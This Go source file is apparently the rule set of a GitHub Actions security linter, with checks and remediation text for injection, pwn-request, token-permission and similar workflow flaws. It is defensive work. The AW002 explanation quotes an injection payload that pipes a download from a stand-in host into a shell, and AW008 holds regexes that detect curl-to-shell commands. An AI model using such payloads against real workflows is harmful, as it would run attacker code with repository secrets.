// Package rules holds the checks. Each rule is a function over a parsed
// workflow plus the text a person needs to understand and fix what it found.
package rules

import (
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/sriharifortitude/actionwarden/internal/expr"
	"github.com/sriharifortitude/actionwarden/internal/workflow"
)

// Severity orders findings. The zero value is Low.
type Severity int

const (
	Low Severity = iota
	Medium
	High
	Critical
)

func (s Severity) String() string {
	return [...]string{"low", "medium", "high", "critical"}[s]
}

// ParseSeverity reads a severity name; "none" is returned as ok with
// none == true, meaning no finding should fail the run.
func ParseSeverity(name string) (s Severity, none bool, ok bool) {
	switch strings.ToLower(name) {
	case "low":
		return Low, false, true
	case "medium":
		return Medium, false, true
	case "high":
		return High, false, true
	case "critical":
		return Critical, false, true
	case "none":
		return 0, true, true
	}
	return 0, false, false
}

// Finding is one problem in one workflow.
type Finding struct {
	Rule     string   `json:"rule"`
	Severity Severity `json:"-"`
	File     string   `json:"file"`
	Line     int      `json:"line"`
	Message  string   `json:"message"`
	Fix      string   `json:"fix,omitempty"`
}

// Rule is a check and its documentation.
type Rule struct {
	ID    string
	Name  string
	Title string
	// Severity is the usual severity; a check may raise or lower it for a
	// finding when the workflow's triggers change how bad it is.
	Severity Severity
	Why      string
	Fix      string
	Check    func(*workflow.Workflow) []Finding
}

// All is every rule, in ID order.
var All = []Rule{
	{ID: "AW001", Name: "unpinned-action", Title: "action not pinned to a commit", Severity: Medium,
		Why: "A tag or branch can be moved to different code after you reviewed it. A workflow that runs `uses: owner/action@v1` runs whatever v1 points at today, with the job's token and secrets. This is how the tj-actions/changed-files compromise (CVE-2025-30066) reached the repositories that used it.",
		Fix: "Pin to the full 40-character commit SHA and keep the tag in a comment: `uses: owner/action@<sha> # v1.2.3`.", Check: checkPinning},
	{ID: "AW002", Name: "script-injection", Title: "untrusted text interpolated into a script", Severity: High,
		Why: "`${{ }}` is substituted into the script text before the shell or JavaScript runs. An issue title of `a\"; curl evil.sh | sh; \"` becomes part of the program. GitHub's security hardening guide names this as the most common workflow vulnerability.",
		Fix: "Pass the value through an environment variable and read it as data: `env: TITLE: ${{ github.event.issue.title }}` then `\"$TITLE\"` in the script.", Check: checkInjection},
	{ID: "AW003", Name: "pwn-request", Title: "privileged workflow checks out pull request code", Severity: Critical,
		Why: "`pull_request_target` and `workflow_run` run with the base repository's secrets and a token that can write. Checking out the pull request's own code in them and then building or testing it runs an outsider's code with those secrets.",
		Fix: "Do not check out the head in a privileged workflow. Build and test in a plain `pull_request` workflow, and pass only its results (as an artifact, never as code) to the privileged one.", Check: checkPwnRequest},
	{ID: "AW004", Name: "token-permissions", Title: "workflow token permissions not restricted", Severity: Medium,
		Why: "Without a `permissions:` block the job gets the repository or organisation default, which may be read and write on everything. A compromised step then has that much reach. `write-all` and unscoped write grants make it explicit.",
		Fix: "Set `permissions: contents: read` at the top of the workflow and grant each write scope only to the job that needs it.", Check: checkPermissions},
	{ID: "AW005", Name: "credential-in-artifact", Title: "checkout credentials can end up in an uploaded artifact", Severity: High,
		Why: "actions/checkout stores the job's token in .git/config unless told not to. An upload-artifact step whose path covers the working directory then publishes that token inside the artifact, readable by anyone who can download artifacts. This is documented publicly as \"ArtiPACKED\".",
		Fix: "Set `persist-credentials: false` on the checkout, and upload only the files you mean to.", Check: checkArtifactCredentials},
	{ID: "AW006", Name: "self-hosted-untrusted", Title: "self-hosted runner reachable from untrusted triggers", Severity: High,
		Why: "A self-hosted runner is not reset between jobs. If this repository is public, a pull request or comment from outside can run code on it, and whatever that code leaves behind is there for the next job.",
		Fix: "Use GitHub-hosted runners for workflows triggered by outsiders, or restrict self-hosted runners to private repositories and require approval for fork runs.", Check: checkSelfHosted},
	{ID: "AW007", Name: "unsafe-commands", Title: "deprecated workflow commands enabled", Severity: High,
		Why: "`::set-env` and `::add-path` let any text a step prints change the environment and PATH of later steps; GitHub disabled them in 2020 because of injection. ACTIONS_ALLOW_UNSECURE_COMMANDS turns them back on.",
		Fix: "Write to the $GITHUB_ENV and $GITHUB_PATH files instead, and remove ACTIONS_ALLOW_UNSECURE_COMMANDS.", Check: checkUnsafeCommands},
	{ID: "AW008", Name: "pipe-to-shell", Title: "downloaded script piped into a shell", Severity: Medium,
		Why: "`curl ... | sh` runs whatever the server returns at that moment, unverified and unpinned.",
		Fix: "Download to a file, verify a checksum or signature you pinned, then run it; or use a pinned action or package.", Check: checkPipeToShell},
	{ID: "AW009", Name: "secrets-inherit", Title: "all secrets passed to a reusable workflow", Severity: Medium,
		Why: "`secrets: inherit` hands the called workflow every secret the caller can see, including ones it has no use for.",
		Fix: "Pass the specific secrets the called workflow declares.", Check: checkSecretsInherit},
	{ID: "AW010", Name: "always-true-condition", Title: "if: condition that is always true", Severity: Medium,
		Why: "When `${{ }}` is only part of an `if:` value, the whole value is a non-empty string, which is true. `if: ${{ github.actor }} == 'dependabot[bot]'` runs for everyone, so a guard written this way guards nothing.",
		Fix: "Put the whole condition inside one `${{ }}`, or write it with no `${{ }}` at all.", Check: checkAlwaysTrue},
}

// Meta is the pseudo-rule for a suppression comment that gives no reason.
var Meta = Rule{ID: "AW000", Name: "ignore-without-reason", Title: "suppression comment without a reason", Severity: Low,
	Why: "A suppression nobody can explain is a finding nobody will revisit.",
	Fix: "Write `# actionwarden:ignore AW001 -- why this is acceptable`."}

// ByID returns a rule by its ID, including AW000.
func ByID(id string) (Rule, bool) {
	if id == Meta.ID {
		return Meta, true
	}
	for _, r := range All {
		if r.ID == id {
			return r, true
		}
	}
	return Rule{}, false
}

// Run applies every rule to a workflow and returns the findings in file order.
func Run(w *workflow.Workflow) []Finding {
	var out []Finding
	for _, r := range All {
		for _, f := range r.Check(w) {
			if f.Fix == "" {
				f.Fix = r.Fix
			}
			out = append(out, f)
		}
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Line != out[j].Line {
			return out[i].Line < out[j].Line
		}
		return out[i].Rule < out[j].Rule
	})
	return out
}

func finding(w *workflow.Workflow, id string, sev Severity, line int, message, fix string) Finding {
	return Finding{Rule: id, Severity: sev, File: w.Path, Line: line, Message: message, Fix: fix}
}

// privileged are the triggers whose runs have the base repository's secrets or
// a write token even though the event was started by someone outside.
var privileged = []string{
	"pull_request_target", "workflow_run", "issue_comment", "issues",
	"pull_request_review", "pull_request_review_comment", "discussion", "discussion_comment",
}

func hasPrivilegedTrigger(w *workflow.Workflow) bool {
	for _, t := range privileged {
		if w.Triggers[t] {
			return true
		}
	}
	return false
}

func isAction(s *workflow.Scalar, name string) bool {
	if s == nil {
		return false
	}
	v := strings.ToLower(strings.TrimSpace(s.Value))
	return v == name || strings.HasPrefix(v, name+"@")
}

// ---- AW001 ----------------------------------------------------------------

var (
	fullSHA = regexp.MustCompile(`^[0-9a-fA-F]{40}$|^[0-9a-fA-F]{64}$`)
	// A branch name is a moving target by construction, so it is worse than a tag.
	branchRefs = map[string]bool{
		"main": true, "master": true, "develop": true, "dev": true, "trunk": true, "head": true,
		"latest": true, "stable": true, "nightly": true, "beta": true, "next": true, "release": true,
	}
	firstParty = map[string]bool{"actions": true, "github": true}
)

func checkPinning(w *workflow.Workflow) []Finding {
	var out []Finding
	check := func(uses *workflow.Scalar, where string) {
		if uses == nil {
			return
		}
		ref := strings.TrimSpace(uses.Value)
		switch {
		case ref == "" || strings.HasPrefix(ref, "./") || strings.HasPrefix(ref, "${{"):
			return
		case strings.HasPrefix(ref, "docker://"):
			if !strings.Contains(ref, "@sha256:") {
				out = append(out, finding(w, "AW001", Medium, uses.Line,
					fmt.Sprintf("%s runs the container image %s by tag, and a tag can be re-pointed; pin it by digest", where, ref),
					"Pin the image by digest: `docker://image@sha256:<digest>`."))
			}
			return
		}
		at := strings.LastIndex(ref, "@")
		if at < 0 {
			return
		}
		name, version := ref[:at], ref[at+1:]
		if fullSHA.MatchString(version) {
			return
		}
		sev := Medium
		detail := fmt.Sprintf("%s uses %s, and the tag %q can be moved to different code", where, name, version)
		switch {
		case branchRefs[strings.ToLower(version)]:
			sev = High
			detail = fmt.Sprintf("%s uses %s@%s, which follows a branch: every push to it runs in your workflow", where, name, version)
		case firstParty[strings.ToLower(strings.SplitN(name, "/", 2)[0])]:
			sev = Low
		}
		out = append(out, finding(w, "AW001", sev, uses.Line, detail, ""))
	}
	for _, j := range w.Jobs {
		check(j.Uses, fmt.Sprintf("job %q", j.ID))
		for _, s := range j.Steps {
			where := fmt.Sprintf("step %q", s.Name)
			if s.Uses != nil && s.Name == s.Uses.Value {
				where = "this step" // unnamed: its name would only repeat the action
			}
			check(s.Uses, where)
		}
	}
	return out
}

// ---- AW002 ----------------------------------------------------------------

func list(items []string) string {
	quoted := make([]string, 0, 3)
	for i, it := range items {
		if i == 3 {
			quoted = append(quoted, fmt.Sprintf("and %d more", len(items)-3))
			break
		}
		quoted = append(quoted, "`"+it+"`")
	}
	return strings.Join(quoted, ", ")
}

func checkInjection(w *workflow.Workflow) []Finding {
	var out []Finding
	sev := High
	if hasPrivilegedTrigger(w) {
		sev = Critical
	}
	report := func(text *workflow.Scalar, kind string, stepName string) {
		if text == nil {
			return
		}
		for _, span := range expr.Extract(text.Value) {
			var refs []string
			if n, err := expr.Parse(span.Src); err == nil {
				refs = expr.Tainted(n)
			} else {
				refs = expr.TaintedLoose(span.Src)
			}
			if len(refs) == 0 {
				continue
			}
			out = append(out, finding(w, "AW002", sev, text.LineAt(span.Start),
				fmt.Sprintf("step %q interpolates %s into %s; whoever controls that text controls the script", stepName, list(refs), kind), ""))
		}
	}
	for _, j := range w.Jobs {
		for _, s := range j.Steps {
			report(s.Run, "a shell script", s.Name)
			if isAction(s.Uses, "actions/github-script") {
				report(s.With["script"], "a JavaScript program", s.Name)
			}
		}
	}
	return out
}

// ---- AW003 ----------------------------------------------------------------

func checkPwnRequest(w *workflow.Workflow) []Finding {
	if !w.Triggers["pull_request_target"] && !w.Triggers["workflow_run"] {
		return nil
	}
	sev := Critical
	trigger := "pull_request_target"
	if !w.Triggers["pull_request_target"] {
		sev, trigger = High, "workflow_run"
	}
	var out []Finding
	for _, j := range w.Jobs {
		for _, s := range j.Steps {
			if !isAction(s.Uses, "actions/checkout") {
				continue
			}
			for _, key := range []string{"ref", "repository"} {
				v := s.With[key]
				if v == nil {
					continue
				}
				if pointsAtPullRequest(v.Value) {
					out = append(out, finding(w, "AW003", sev, v.Line,
						fmt.Sprintf("step %q checks out the pull request's code (%s: %s) in a %s workflow, which runs with the base repository's secrets and write token", s.Name, key, strings.TrimSpace(v.Value), trigger), ""))
				}
			}
		}
	}
	return out
}

func pointsAtPullRequest(value string) bool {
	lower := strings.ToLower(value)
	if strings.Contains(lower, "refs/pull/") || strings.Contains(lower, "refs/remotes/pull/") {
		return true
	}
	for _, span := range expr.Extract(value) {
		if n, err := expr.Parse(span.Src); err == nil {
			for _, path := range expr.Refs(n) {
				if expr.PointsAtUntrustedCode(path) {
					return true
				}
			}
			continue
		}
		if strings.Contains(strings.ToLower(span.Src), "head") {
			return true
		}
	}
	return false
}

// ---- AW004 ----------------------------------------------------------------

func checkPermissions(w *workflow.Workflow) []Finding {
	var out []Finding
	if p := w.Permissions; p != nil {
		if p.All == "write-all" {
			out = append(out, finding(w, "AW004", High, p.Line, "the workflow grants write-all to every job", ""))
		} else if len(w.Jobs) > 1 {
			for _, scope := range sortedKeys(p.Scopes) {
				if p.Scopes[scope] == "write" {
					out = append(out, finding(w, "AW004", Medium, p.Line,
						fmt.Sprintf("the workflow grants %s: write to all %d jobs; give it only to the job that needs it", scope, len(w.Jobs)), ""))
				}
			}
		}
	}
	for _, j := range w.Jobs {
		switch {
		case j.Permissions != nil && j.Permissions.All == "write-all":
			out = append(out, finding(w, "AW004", High, j.Permissions.Line, fmt.Sprintf("job %q grants write-all", j.ID), ""))
		case j.Permissions == nil && w.Permissions == nil:
			out = append(out, finding(w, "AW004", Medium, j.Line,
				fmt.Sprintf("job %q has no permissions: block and neither has the workflow, so its token gets the repository or organisation default, which may be read/write", j.ID), ""))
		}
	}
	return out
}

func sortedKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

// ---- AW005 ----------------------------------------------------------------

func uploadsWorkingTree(path string) bool {
	for _, line := range strings.Split(path, "\n") {
		p := strings.TrimSpace(line)
		p = strings.TrimPrefix(p, "!")
		switch p {
		case ".", "./", "*", "**", "**/*", "./*", "~", "~/", "..", "../":
			return true
		}
		if strings.HasPrefix(p, ".git") || strings.Contains(p, "/.git") {
			return true
		}
	}
	return false
}

func checkArtifactCredentials(w *workflow.Workflow) []Finding {
	var out []Finding
	for _, j := range w.Jobs {
		var persisting *workflow.Step
		for _, s := range j.Steps {
			switch {
			case isAction(s.Uses, "actions/checkout"):
				if v := s.With["persist-credentials"]; v == nil || strings.ToLower(strings.TrimSpace(v.Value)) != "false" {
					persisting = s
				}
			case isAction(s.Uses, "actions/upload-artifact") && persisting != nil:
				if p := s.With["path"]; p != nil && uploadsWorkingTree(p.Value) {
					out = append(out, finding(w, "AW005", High, p.Line,
						fmt.Sprintf("step %q uploads %q, which includes .git/config, where step %q left the job's token (persist-credentials is not false)", s.Name, strings.TrimSpace(p.Value), persisting.Name), ""))
				}
			}
		}
	}
	return out
}

// ---- AW006 ----------------------------------------------------------------

func checkSelfHosted(w *workflow.Workflow) []Finding {
	var trigger string
	sev := Medium
	for _, t := range []string{"pull_request_target", "issue_comment", "pull_request_review_comment", "issues", "workflow_run", "pull_request"} {
		if w.Triggers[t] {
			trigger = t
			if t != "pull_request" {
				sev = High
			}
			break
		}
	}
	if trigger == "" {
		return nil
	}
	var out []Finding
	for _, j := range w.Jobs {
		for _, label := range j.RunsOn {
			if strings.EqualFold(strings.TrimSpace(label.Value), "self-hosted") {
				out = append(out, finding(w, "AW006", sev, label.Line,
					fmt.Sprintf("job %q runs on a self-hosted runner and the workflow is triggered by %s; if this repository is public, an outsider's code runs on that machine", j.ID, trigger), ""))
				break
			}
		}
	}
	return out
}

// ---- AW007 ----------------------------------------------------------------

func checkUnsafeCommands(w *workflow.Workflow) []Finding {
	var out []Finding
	envs := []map[string]*workflow.Scalar{w.Env}
	for _, j := range w.Jobs {
		envs = append(envs, j.Env)
		for _, s := range j.Steps {
			envs = append(envs, s.Env)
			if s.Run == nil {
				continue
			}
			for _, cmd := range []string{"::set-env", "::add-path"} {
				if i := strings.Index(s.Run.Value, cmd); i >= 0 {
					out = append(out, finding(w, "AW007", High, s.Run.LineAt(i),
						fmt.Sprintf("step %q prints the deprecated %s command", s.Name, cmd), ""))
				}
			}
		}
	}
	for _, env := range envs {
		if v := env["ACTIONS_ALLOW_UNSECURE_COMMANDS"]; v != nil && strings.EqualFold(strings.TrimSpace(v.Value), "true") {
			out = append(out, finding(w, "AW007", High, v.Line, "ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables the commands GitHub disabled for injection", ""))
		}
	}
	return out
}

// ---- AW008 ----------------------------------------------------------------

var (
	pipeToShell    = regexp.MustCompile(`\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z|da|k)?sh\b`)
	processSubst   = regexp.MustCompile(`\b(?:ba|z)?sh\s+<\(\s*(?:curl|wget)\b`)
	lineContinuing = regexp.MustCompile(`\\\n`)
)

func checkPipeToShell(w *workflow.Workflow) []Finding {
	var out []Finding
	for _, j := range w.Jobs {
		for _, s := range j.Steps {
			if s.Run == nil {
				continue
			}
			// Join `\`-continued lines so a pipe on the next line is still seen.
			// Replacing a backslash-newline by two spaces keeps every offset's
			// line count the same only when we map back, so search the joined
			// text and attribute to the step's first line when it was joined.
			text := s.Run.Value
			joined := lineContinuing.ReplaceAllString(text, "  ")
			for _, re := range []*regexp.Regexp{pipeToShell, processSubst} {
				loc := re.FindStringIndex(joined)
				if loc == nil || commentLine(joined, loc[0]) {
					continue
				}
				line := s.Run.Line
				if joined == text {
					line = s.Run.LineAt(loc[0])
				}
				out = append(out, finding(w, "AW008", Medium, line,
					fmt.Sprintf("step %q pipes a download into a shell", s.Name), ""))
				break
			}
		}
	}
	return out
}

func commentLine(text string, at int) bool {
	start := strings.LastIndex(text[:at], "\n") + 1
	return strings.HasPrefix(strings.TrimSpace(text[start:at]), "#")
}

// ---- AW009 ----------------------------------------------------------------

func checkSecretsInherit(w *workflow.Workflow) []Finding {
	var out []Finding
	for _, j := range w.Jobs {
		if j.SecretsInherit == nil || !strings.EqualFold(strings.TrimSpace(j.SecretsInherit.Value), "inherit") {
			continue
		}
		sev := Medium
		if j.Uses != nil && strings.HasPrefix(strings.TrimSpace(j.Uses.Value), "./") {
			sev = Low
		}
		out = append(out, finding(w, "AW009", sev, j.SecretsInherit.Line,
			fmt.Sprintf("job %q passes every secret to the reusable workflow it calls", j.ID), ""))
	}
	return out
}

// ---- AW010 ----------------------------------------------------------------

func alwaysTrue(cond *workflow.Scalar) bool {
	if cond == nil {
		return false
	}
	v := strings.TrimSpace(cond.Value)
	if !strings.Contains(v, "${{") {
		return false
	}
	spans := expr.Extract(v)
	return !(len(spans) == 1 && spans[0].Start == 0 && spans[0].End == len(v))
}

func checkAlwaysTrue(w *workflow.Workflow) []Finding {
	var out []Finding
	flag := func(cond *workflow.Scalar, where string) {
		if alwaysTrue(cond) {
			out = append(out, finding(w, "AW010", Medium, cond.Line,
				fmt.Sprintf("%s has `if: %s`; with text outside the `${{ }}` the whole value is a non-empty string, which is always true", where, strings.TrimSpace(cond.Value)), ""))
		}
	}
	for _, j := range w.Jobs {
		flag(j.If, fmt.Sprintf("job %q", j.ID))
		for _, s := range j.Steps {
			flag(s.If, fmt.Sprintf("step %q", s.Name))
		}
	}
	return out
}
